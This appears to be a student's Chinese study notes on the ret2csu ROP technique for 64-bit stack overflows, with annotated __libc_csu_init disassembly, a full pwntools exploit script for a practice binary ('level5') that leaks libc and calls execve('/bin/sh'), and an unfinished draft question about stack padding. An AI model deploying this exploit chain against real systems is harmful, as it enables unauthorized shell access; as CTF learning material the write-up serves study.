# 中阶ROP

这个主要涉及到，64位的栈溢出，涉及到寄存器的取用。利用比较巧妙地Gadgets。

## ret2csu

直接例题上来，边看边讲原理。

**在64位的程序中，前六个参数存在寄存器里面，而不是在栈上，所以要构造栈结构的时候，特别是要构造参数的时候，就要利用到相应的寄存器，的pop.(这里回想一下，利用系统调用的原理。)**

这里有个特例，几乎相当于一个万能公式。

在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。  这时候，我们可以利用 **x64 下的 __libc_csu_init 中的 gadgets**。这个函数是用来对 libc  进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)

```shell
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

*不难发现，40061A这一段*往下全是我们要的gadgets,而上面那一段，*400600*往下都是对这些寄存器的操作。



**值得注意的是，这里**`0000000000400606                 mov     edi, r15d`**这句话是赋值给edi，edi是32位的存储器，只有32位二进制**，所以这里的mov只能把r15的低32位传给edi。（但是rdi是兼容edi的，所以rdi此时的高32位其实为0）所以我们可以控制rdi的低32位。

![image-20210207210050191](C:\Users\lsp\AppData\Roaming\Typora\typora-user-images\image-20210207210050191.png)

这是一个重点，我们恰巧发现，前三个rdi rsi rdx寄存器刚好是我们的上面**三个mov语句**

此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。



从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。



![image-20210208102532350](C:\Users\lsp\AppData\Roaming\Typora\typora-user-images\image-20210208102532350.png)



暂时没看懂.

懂了，dog/dog/dog。

上面为什么要覆盖aaa····在last的前面呢?，因为，我们前一步跳转到了csu_front并且，汇编中，指令是在.text段按顺序执行的，所以当我们修改完参数之后，函数又运行到了csu_end，这时候，函数首先add rsp, 8,接着又来了6个pop所以为了跳过这几个，我们需要填充 6*8 + 8 =56=0x38个辣鸡字节直接运行retn，然后我们的last就会被指令寄存器当作下一个返回地址了。。。



这里要注意的是，64位程序中，retn仿佛是必要的，不会像32位一样傻傻的，构造ROP链容易破坏栈结构。

然后就是快乐的写exp了。

```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15dkk
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

```

-----

## 思考和改进

> - 思考

我们这次输入的字节长达128，有些题目会对长度进行限制，那么我们要通过什么来减少输入的字节长度呢？

> -第一点

改进rbx和rbp,可以看到，为了不再次跳回循环，我们控制两个的值位rbx+1 = rbp,如果我们

## 最后上一张图

![image-20210207210715655](C:\Users\lsp\AppData\Roaming\Typora\typora-user-images\image-20210207210715655.png)





学长好，夜晚打扰不好意思，我想问你一个关于64位程序ROP构造的问题。构造64位ROP链的时候，因为调用约定不和32位相同，需要构造栈结构，然后我有一直写不出来，后来我发现，别人的exp，每次回到调用函数的时候，会有一个额外的填充。

![image-20210209235250778](C:\Users\lsp\AppData\Roaming\Typora\typora-user-images\image-20210209235250778.png)

就是这个，然后我查资料，说是填充pop，只需要retn那为什么每个不同的64位程序填充都不一样呢？

![image-20210209235412334](C:\Users\lsp\AppData\Roaming\Typora\typora-user-images\image-20210209235412334.png)

按理说大小都一样啊。

不同的汇编，对应不同的代码，所以有不同的大小。

